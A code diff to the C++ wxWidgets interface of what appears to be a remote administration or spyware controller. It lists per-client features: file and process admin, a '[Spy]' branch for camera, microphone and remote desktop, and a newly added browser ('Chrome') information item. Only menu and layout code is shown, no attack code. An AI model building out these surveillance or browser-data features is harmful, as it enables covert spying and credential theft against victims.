@@ -52,7 +52,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
     wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
-    //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
+    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
+    //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]")); <- Aqui ira fun
 
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
@@ -66,6 +67,9 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
+
+    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
+    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));
 
     //Sizer para hacer el treeview dinamico al hacer resize
     wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
